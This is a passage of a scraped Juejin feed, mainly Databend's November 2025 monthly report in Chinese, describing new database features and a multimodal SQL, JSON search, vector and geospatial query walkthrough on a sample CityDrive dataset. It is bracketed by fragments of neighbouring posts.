<li><strong>反向撤销</strong>：通过本地缓存过滤延迟消息，避免已支付订单被取消；</li>
<li><strong>重试机制</strong>：3层重试（支付回调重试+Stream内置重试+补偿任务重试），覆盖所有临时异常；</li>
<li><strong>补偿操作</strong>：本地消息表记录补偿任务，死信队列兜底，确保最终一致性；</li>
<li><strong>闭环保障</strong>：定时校验异常订单，兜底极端场景，实现“零资损”。</li>
</ol>
<p>这套方案完全基于Spring Cloud Stream RabbitMQ实现，代码可直接运行，覆盖订单支付全闭环，适配高并发、高可用场景，符合大厂落地标准。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Databend 11 月月报：多模态查询智能]]></title>    <link>https://juejin.cn/post/7579808521203679266</link>    <guid>https://juejin.cn/post/7579808521203679266</guid>    <pubDate>2025-12-04T09:36:52.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7579808521203679266" data-draft-id="7579480677902270499" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content=" Databend 11 月月报：多模态查询智能"/> <meta itemprop="keywords" content="数据库"/> <meta itemprop="datePublished" content="2025-12-04T09:36:52.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Databend"/> <meta itemprop="url" content="https://juejin.cn/user/4477651847485534"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
             Databend 11 月月报：多模态查询智能
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4477651847485534/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Databend
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-04T09:36:52.000Z" title="Thu Dec 04 2025 09:36:52 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-04
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读7分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>Hi，Databend 的朋友们！🚀</p>
<p>11 月，我们发布了 <strong>17 个 nightly 版本</strong>，致力于打造更丰富的数据体验。本月上线了 TimestampTz 支持、HTTP Arrow payloads、支持 RBAC 的脱敏策略，并进行了三轮 Runtime Filter 调优，同时针对多模态负载改进了全文索引和 VECTOR 支持。现在的查询接口支持从 JSON、Arrow IPC 到几何数据等多种输出格式，助力分析团队更高效地构建多样化应用。</p>
<h2 data-id="heading-0">月度数据</h2>
<p>从 v1.2.834-nightly 到 v1.2.850-nightly，我们累计合并了 <strong>27 个新功能</strong>、<strong>28 个 bug 修复</strong>、<strong>18 项重构</strong>、<strong>6 项 CI/构建改进</strong> 以及 <strong>27 项体验优化</strong>。</p>
<h2 data-id="heading-1">本月亮点</h2>
<h3 data-id="heading-2">🔥 核心新功能</h3>
<ul>
<li><strong>TimestampTz 与 ANSI 日期关键字</strong> — 新增 <code>TimestampTz</code>、<code>CURRENT_DATE</code>、<code>CURRENT_TIME</code> 和 <code>DATE ± INTERVAL</code> 语义，确保跨区域的时间处理流程具有良好的可移植性。</li>
<li><strong>Arrow over HTTP 与几何元数据</strong> — 查询接口支持返回带有时区和几何格式提示的 Arrow IPC 响应，实现低延迟 BI 分析。</li>
<li><strong>UDTF Server Runtime</strong> — 用户定义的表函数现在作为托管服务运行，具备传输诊断和 Python 导入缓存功能。</li>
<li><strong>支持 Position 的 SQL</strong> — 标准 <code>POSITION</code> 列现在可以在 SQL 兼容的流程中查询，简化了从传统引擎的迁移。</li>
<li><strong>System Streams 遥测</strong> — <code>system.streams</code> 暴露 <code>has_data</code> 字段，配合更丰富的验证输出，方便调试数据摄入。</li>
</ul>
<h3 data-id="heading-3">🧠 多模态查询与分析</h3>
<ul>
<li><strong>倒排索引 TOP-N 剪枝与缓存</strong> — 针对 JSON/Variant 文本的 ORDER BY/LIMIT 查询现在会自动跳过无关数据块，并结合了更新后的向量量化评分。</li>
<li><strong>Decimal64 与 Arrow 56 升级</strong> — 原生格式表直接反序列化 Decimal64 列，升级后的 Arrow/Parquet 组件支持一致的 Schema 演进。</li>
<li><strong>Bitmap 工具集</strong> — <code>bitmap_to_array</code> 配合新的 Runtime Filter 机制，解锁更快的集合分析和跨模态 Join。</li>
<li><strong>虚拟列全面支持</strong> — 外部表、Selection 查询和 LIMIT 流程现在都支持虚拟列计算。</li>
</ul>
<h3 data-id="heading-4">🛡️ 治理与信任</h3>
<ul>
<li><strong>脱敏策略升级</strong> — 多列 <code>USING</code> 子句、RBAC 强制执行、冲突检测和删除保护，确保隐私规则的一致性。</li>
<li><strong>策略可观测性</strong> — <code>policy_reference</code> 表函数记录了脱敏/行访问策略的应用位置，便于快速合规审计。</li>
<li><strong>安全默认配置</strong> — 序列查找、JWT 绑定和 MySQL TLS 握手增加了防护措施，防止权限提升或部分会话问题。</li>
</ul>
<h3 data-id="heading-5">⚙️ 性能与运维</h3>
<ul>
<li><strong>Runtime Filter 优化（1-3 部分）</strong> — 自适应过滤器现在支持可空转换、捕获时序并避免冗余转换，在分布式 Join 中节省数秒时间。</li>
<li><strong>同步背压溢出</strong> — 溢出决策改为同步处理，在有效控制内存使用的同时，避免产生嘈杂的日志。</li>
<li><strong>Parquet 字典开关与时区一致性</strong> — Fuse 表新增 <code>enable_parquet_dictionary</code>；查询时区传播已端到端实现（HTTP 头、会话状态、Clamp 辅助函数）。</li>
<li><strong>Meta 服务弹性</strong> — 针对聚合溢出、opendal 0.54.1 升级和 fetch-add 路径增加了更广泛的日志记录，减少了繁忙集群中的热点问题。</li>
</ul>
<h3 data-id="heading-6">🐛 稳定性与质量</h3>
<ul>
<li>修复了 CSV 摄入、Pivot 投影和聚合溢出的回退问题；</li>
<li>COUNT DISTINCT、ZIP 导入和 Bitmap 数组边界情况现在表现确定；</li>
<li>密码策略描述符、Record-Batch 转换和大型 JWKS/MariaDB 会话不再抛出运行时异常。</li>
</ul>
<h2 data-id="heading-7">核心功能：多模态数据分析 (CityDrive 场景)</h2>
<p>现在的 Databend 数据库足以支持<strong>所有检索模式</strong>——关系型、JSON、向量、Bitmap、地理空间——无需启动单独的服务。这正是 <a href="https://link.juejin.cn?target=https%3A%2F%2Fdocs.databend.cn%2Fguides%2Fquery%2F" target="_blank" title="https://docs.databend.cn/guides/query/" ref="nofollow noopener noreferrer">多模态数据分析指南</a> 的核心价值所在，该指南围绕 CityDrive Intelligence 数据集展开。基于同样的 <code>video_id</code>/<code>frame_id</code> 列，你可以同时使用 SQL 过滤、Elasticsearch 风格的 <code>QUERY()</code>、HNSW 向量搜索和 GEOMETRY Join，让你仅需在一个数据仓库中即可完成所有工作。本期焦点将带你回顾这一场景，一步步展示统一检索在实战中的威力。</p>
<h3 data-id="heading-8">0. 自动化数据摄入</h3>
<p>CityDrive 将每一批次数据导出为 Parquet。 <a href="https://link.juejin.cn?target=https%3A%2F%2Fdocs.databend.cn%2Fguides%2Fquery%2Flakehouse-etl" target="_blank" title="https://docs.databend.cn/guides/query/lakehouse-etl" ref="nofollow noopener noreferrer">Lakehouse ETL 指南</a> 设置了一个可复用的 Stage 和<strong>任务驱动的 COPY 流程</strong>，持续导入每种模态的数据：</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- 连接到 CityDrive 的 S3 存储桶</span>
<span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">OR</span> REPLACE CONNECTION citydrive_s3
    STORAGE_TYPE<span class="hljs-operator">=</span><span class="hljs-string">'s3'</span>
    ACCESS_KEY_ID<span class="hljs-operator">=</span><span class="hljs-string">'&lt;AWS_ACCESS_KEY_ID&gt;'</span>
    SECRET_ACCESS_KEY<span class="hljs-operator">=</span><span class="hljs-string">'&lt;AWS_SECRET_ACCESS_KEY&gt;'</span>;

<span class="hljs-comment">-- 指向原始多模态导出的共享 Stage</span>
<span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">OR</span> REPLACE STAGE citydrive_stage
    URL<span class="hljs-operator">=</span><span class="hljs-string">'s3://citydrive-lakehouse/raw/'</span>
    CONNECTION<span class="hljs-operator">=</span>(CONNECTION_NAME<span class="hljs-operator">=</span><span class="hljs-string">'citydrive_s3'</span>)
    FILE_FORMAT<span class="hljs-operator">=</span>(TYPE<span class="hljs-operator">=</span><span class="hljs-string">'PARQUET'</span>);

<span class="hljs-comment">-- 自动化 ETL：每 10 分钟加载一次视频帧元数据</span>
<span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">OR</span> REPLACE TASK task_load_citydrive_videos
    WAREHOUSE<span class="hljs-operator">=</span><span class="hljs-string">'default'</span>
    SCHEDULE<span class="hljs-operator">=</span><span class="hljs-number">10</span> <span class="hljs-keyword">MINUTE</span>
<span class="hljs-keyword">AS</span>
<span class="hljs-keyword">COPY</span> <span class="hljs-keyword">INTO</span> citydrive_videos (
    video_id,
    vehicle_id,
    capture_date,
    route_name,
    weather,
    camera_source,
    duration_sec
) <span class="hljs-keyword">FROM</span> (
    <span class="hljs-keyword">SELECT</span>
        video_id::STRING,
        vehicle_id::STRING,
        capture_date::<span class="hljs-type">DATE</span>,
        route_name::STRING,
        weather::STRING,
        camera_source::STRING,
        duration_sec::<span class="hljs-type">INT</span>
    <span class="hljs-keyword">FROM</span> <span class="hljs-variable">@citydrive</span>_stage<span class="hljs-operator">/</span>videos<span class="hljs-operator">/</span>
) FILE_FORMAT<span class="hljs-operator">=</span>(TYPE<span class="hljs-operator">=</span><span class="hljs-string">'PARQUET'</span>);

<span class="hljs-comment">-- 自动化 ETL：同步加载帧数据</span>
<span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">OR</span> REPLACE TASK task_load_frame_events
    WAREHOUSE<span class="hljs-operator">=</span><span class="hljs-string">'default'</span>
    SCHEDULE<span class="hljs-operator">=</span><span class="hljs-number">10</span> <span class="hljs-keyword">MINUTE</span>
<span class="hljs-keyword">AS</span>
<span class="hljs-keyword">COPY</span> <span class="hljs-keyword">INTO</span> frame_events (
    frame_id,
    video_id,
    frame_index,
    collected_at,
    event_tag,
    risk_score,
    speed_kmh
) <span class="hljs-keyword">FROM</span> (
    <span class="hljs-keyword">SELECT</span>
        frame_id::STRING,
        video_id::STRING,
        frame_index::<span class="hljs-type">INT</span>,
        collected_at::<span class="hljs-type">TIMESTAMP</span>,
        event_tag::STRING,
        risk_score::<span class="hljs-keyword">DOUBLE</span>,
        speed_kmh::<span class="hljs-keyword">DOUBLE</span>
    <span class="hljs-keyword">FROM</span> <span class="hljs-variable">@citydrive</span>_stage<span class="hljs-operator">/</span>frame<span class="hljs-operator">-</span>events<span class="hljs-operator">/</span>
) FILE_FORMAT<span class="hljs-operator">=</span>(TYPE<span class="hljs-operator">=</span><span class="hljs-string">'PARQUET'</span>);

<span class="hljs-comment">-- 激活任务，数据自动导入</span>
<span class="hljs-keyword">ALTER</span> TASK task_load_citydrive_videos RESUME;
<span class="hljs-keyword">ALTER</span> TASK task_load_frame_events RESUME;
</code></pre>
<h3 data-id="heading-9">1. 关系型 SQL 分析 (指南: SQL Analytics)</h3>
<p>基础表保存了规范的车辆视频帧指标：</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">OR</span> REPLACE <span class="hljs-keyword">TABLE</span> citydrive_videos (...);
<span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">OR</span> REPLACE <span class="hljs-keyword">TABLE</span> frame_events (...);

<span class="hljs-keyword">WITH</span> recent_videos <span class="hljs-keyword">AS</span> (
    <span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> citydrive_videos
    <span class="hljs-keyword">WHERE</span> capture_date <span class="hljs-operator">&gt;=</span> <span class="hljs-string">'2025-01-01'</span> <span class="hljs-keyword">AND</span> capture_date <span class="hljs-operator">&lt;</span> <span class="hljs-string">'2025-01-04'</span>
)
<span class="hljs-keyword">SELECT</span> v.video_id, v.route_name, <span class="hljs-built_in">COUNT</span>(f.frame_id) <span class="hljs-keyword">AS</span> flagged_frames
<span class="hljs-keyword">FROM</span> recent_videos v
<span class="hljs-keyword">LEFT</span> <span class="hljs-keyword">JOIN</span> frame_events f <span class="hljs-keyword">USING</span>(video_id)
<span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> v.video_id, v.route_name
<span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> flagged_frames <span class="hljs-keyword">DESC</span>;
</code></pre>
<p><code>LATERAL FLATTEN</code> 连接 <code>frame_metadata_catalog</code> 进行嵌套检测，而 <code>ROLLUP</code>/<code>CUBE</code> 按路线和天气汇总风险。本月发布的 Runtime Filter 增强功能确保即使在数据规模扩大的情况下，这些 Join 操作依然响应迅速。</p>
<h3 data-id="heading-10">2. JSON 与搜索 (指南: JSON &amp; Search)</h3>
<p>倒排索引允许进行 Elasticsearch 风格的过滤，而无需复制数据：</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">OR</span> REPLACE <span class="hljs-keyword">TABLE</span> frame_metadata_catalog (
    doc_id STRING,
    meta_json VARIANT,
    captured_at <span class="hljs-type">TIMESTAMP</span>,
    INVERTED INDEX idx_meta_json(meta_json)
);

<span class="hljs-keyword">SELECT</span> doc_id, captured_at
<span class="hljs-keyword">FROM</span> frame_metadata_catalog
<span class="hljs-keyword">WHERE</span> QUERY(<span class="hljs-string">'meta_json.scene.weather_code:rain AND meta_json.camera.sensor_view:roof'</span>)
<span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> captured_at;
</code></pre>
<p><code>policy_reference</code> 函数配合脱敏策略控制，意味着你可以对任何镜像这些 JSON 负载的列应用感知 RBAC 的隐私保护，可选的 Arrow-over-HTTP 响应则将过滤后的负载直接流式传输到 BI 工具中。</p>
<h3 data-id="heading-11">3. 向量搜索 (指南: Vector Search)</h3>
<p>语义搜索与 SQL 并行运行：</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">OR</span> REPLACE <span class="hljs-keyword">TABLE</span> frame_embeddings (
    frame_id STRING,
    video_id STRING,
    sensor_view STRING,
    embedding VECTOR(<span class="hljs-number">512</span>),
    encoder_build STRING,
    created_at <span class="hljs-type">TIMESTAMP</span>,
    VECTOR INDEX idx_frame_embeddings(embedding) DISTANCE<span class="hljs-operator">=</span><span class="hljs-string">'cosine'</span>
);

<span class="hljs-keyword">WITH</span> query_embedding <span class="hljs-keyword">AS</span> (
    <span class="hljs-keyword">SELECT</span> embedding <span class="hljs-keyword">FROM</span> frame_embeddings <span class="hljs-keyword">WHERE</span> frame_id<span class="hljs-operator">=</span><span class="hljs-string">'FRAME-0101'</span>
)
<span class="hljs-keyword">SELECT</span> e.frame_id, e.video_id,
       COSINE_DISTANCE(e.embedding, q.embedding) <span class="hljs-keyword">AS</span> distance
<span class="hljs-keyword">FROM</span> frame_embeddings e
<span class="hljs-keyword">CROSS</span> <span class="hljs-keyword">JOIN</span> query_embedding q
<span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> distance
LIMIT <span class="hljs-number">3</span>;
</code></pre>
<h3 data-id="heading-12">4. 地理空间分析 (指南: Geo Analytics)</h3>
<p>Geo 表使用相同的 ID，所以“这发生在哪里？”只是另一个 Join：</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">OR</span> REPLACE <span class="hljs-keyword">TABLE</span> frame_geo_points (
    video_id STRING,
    frame_id STRING,
    position_wgs84 GEOMETRY,
    solution_grade <span class="hljs-type">INT</span>,
    source_system STRING,
    created_at <span class="hljs-type">TIMESTAMP</span>
);

<span class="hljs-keyword">SELECT</span> f.frame_id, ST_DISTANCE(g.position_wgs84, s.signal_position) <span class="hljs-keyword">AS</span> meters_to_signal
<span class="hljs-keyword">FROM</span> frame_geo_points g
<span class="hljs-keyword">JOIN</span> signal_contact_points s <span class="hljs-keyword">USING</span>(frame_id)
<span class="hljs-keyword">JOIN</span> frame_events f <span class="hljs-keyword">USING</span>(frame_id)
<span class="hljs-keyword">WHERE</span> ST_WITHIN(g.position_wgs84,
      TO_GEOMETRY(<span class="hljs-string">'SRID=4326;POLYGON((114.05 22.54, 114.13 22.54, 114.13 22.57, 114.05 22.57, 114.05 22.54))'</span>));
</code></pre>
<p>最后，用<strong>一条 SQL 语句</strong>将所有内容串联起来：过滤 JSON 标签、查找向量邻居并检查信号距离：</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-keyword">WITH</span> json_hits <span class="hljs-keyword">AS</span> (
    <span class="hljs-keyword">SELECT</span> doc_id
    <span class="hljs-keyword">FROM</span> frame_metadata_catalog
    <span class="hljs-keyword">WHERE</span> QUERY(<span class="hljs-string">'meta_json.media_meta.tagging.labels:pedestrian'</span>)
),
vector_hits <span class="hljs-keyword">AS</span> (
    <span class="hljs-keyword">SELECT</span> frame_id
    <span class="hljs-keyword">FROM</span> frame_embeddings
    <span class="hljs-keyword">WHERE</span> COSINE_DISTANCE(
          embedding,
          (<span class="hljs-keyword">SELECT</span> embedding <span class="hljs-keyword">FROM</span> frame_embeddings <span class="hljs-keyword">WHERE</span> frame_id<span class="hljs-operator">=</span><span class="hljs-string">'FRAME-0102'</span>)
    ) <span class="hljs-operator">&lt;</span> <span class="hljs-number">0.3</span>
)
<span class="hljs-keyword">SELECT</span> f.frame_id, v.route_name, s.distance_m
<span class="hljs-keyword">FROM</span> frame_events f
<span class="hljs-keyword">JOIN</span> citydrive_videos v <span class="hljs-keyword">USING</span>(video_id)
<span class="hljs-keyword">JOIN</span> json_hits j <span class="hljs-keyword">ON</span> j.doc_id <span class="hljs-operator">=</span> f.frame_id
<span class="hljs-keyword">JOIN</span> vector_hits vh <span class="hljs-keyword">ON</span> vh.frame_id <span class="hljs-operator">=</span> f.frame_id
<span class="hljs-keyword">JOIN</span> signal_contact_points s <span class="hljs-keyword">USING</span>(frame_id);
</code></pre>
<p>这一条查询跨越了结构化事实、JSON 元数据、向量相似度和地理空间距离——全部在 Databend 中执行。这就是统一多模态检索的魅力。</p>
<p>📘 按照顺序（SQL Analytics → JSON &amp; Search → Vector Search → Geo Analytics）跟随指南，在你的集群上重现这个完整的端到端流程。一个数仓，搞定所有分析模式。</p>
<hr/>
<p>Databend 现已演进为一个<strong>统一的分析引擎</strong>：从经典的 SQL 查询、JSON 检索、向量相似度匹配，到地理空间分析，再到自动化的数据导入与 ETL，所有这些能力都已集成在同一个数据库中。你无需再在各种数据库或服务之间周转，就能直接从类似 CityDrive 的数据集中挖掘出深层价值。</p>
<h2 data-id="heading-13">关于 Databend</h2>
<p>Databend 是一款 100% Rust 构建、面向对象存储设计的新一代开源云原生数据仓库，统一支持 BI 分析、AI 向量、全文检索及地理空间分析等多模态能力。期待您的关注，一起打造新一代开源 AI + Data Cloud。</p>
<p>👨‍💻‍ Databend Cloud：<a href="https://link.juejin.cn?target=https%3A%2F%2Fdatabend.cn" title="https://link.juejin.cn?target=https%3A%2F%2Fdatabend.cn" target="_blank">databend.cn</a></p>
<p>📖 Databend 文档：<a href="https://link.juejin.cn?target=https%3A%2F%2Fdocs.databend.cn" title="https://link.juejin.cn?target=https%3A%2F%2Fdocs.databend.cn" target="_blank">docs.databend.cn</a></p>
<p>💻 Wechat：Databend</p>
<p>✨ GitHub：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fdatabendlabs%2Fdatabend" title="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fdatabendlabs%2Fdatabend" target="_blank">github.com/databendlab…</a></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[第2讲：BTC-密码学原理 北大肖臻老师客堂笔记]]></title>    <link>https://juejin.cn/post/7579813925995675689</link>    <guid>https://juejin.cn/post/7579813925995675689</guid>    <pubDate>2025-12-04T09:39:29.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7579813925995675689" data-draft-id="7579716343454138411" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="第2讲：BTC-密码学原理 北大肖臻老师客堂笔记"/> <meta itemprop="keywords" content="前端"/> <meta itemprop="datePublished" content="2025-12-04T09:39:29.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="前端涂涂"/> <meta itemprop="url" content="https://juejin.cn/user/3740972207312249"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            第2讲：BTC-密码学原理 北大肖臻老师客堂笔记
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3740972207312249/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    前端涂涂
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-04T09:39:29.000Z" title="Thu Dec 04 2025 09:39:29 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-04
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读9分钟
